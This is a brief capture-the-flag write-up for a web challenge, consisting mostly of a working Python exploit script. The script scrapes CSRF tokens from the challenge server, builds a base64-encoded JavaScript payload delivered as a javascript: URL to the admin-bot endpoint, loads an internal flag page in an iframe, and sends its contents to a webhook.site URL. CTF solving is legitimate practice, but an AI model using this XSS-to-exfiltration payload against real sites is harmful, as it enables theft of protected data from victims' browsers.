---
created: 1969-12-31T19:00
updated: 2025-07-28T02:13
---

Well XSS is easy, just use `javascript:alert(1)` as the url to open.

So how do we get the flag? The token itself is HTTP only so we can't just get that.

```python
import requests
import base64
t='http://34.134.162.213:17001'
s=requests.Session()
csrf_token = s.get(f"{t}/").text.split('csrf-token" content="')[1].split('"')[0]
print(csrf_token)
csrf_token2 = s.get(f"{t}/").text.split('csrf-token" content="')[1].split('"')[0]
print(csrf_token2)

payload = base64.b64encode(f"""
fetch('https://webhook.site/ae498600-1949-4b36-96c2-24127fd673fd?f=preload');
document.cookie='';
const iframe = document.createElement('iframe');
const token = '{csrf_token2}';
iframe.src = 'http://localhost:3000/get_flag?csrf_token='+token;
document.body.appendChild(iframe);
iframe.onload = () => {{
    try {{
        const flag = iframe.contentDocument.body.innerText;
        fetch('https://webhook.site/ae498600-1949-4b36-96c2-24127fd673fd?f='+flag);
    }} catch (e) {{
        fetch('https://webhook.site/ae498600-1949-4b36-96c2-24127fd673fd?f='+e);
    }}
}};
""".encode()).decode()

r=s.post(f"{t}/visit_url",data={
'url': f"javascript:eval(atob('{payload}'))",
'csrf_token': csrf_token
})
print(r.text)
```

Again forgot the flag, but I solved it like this.
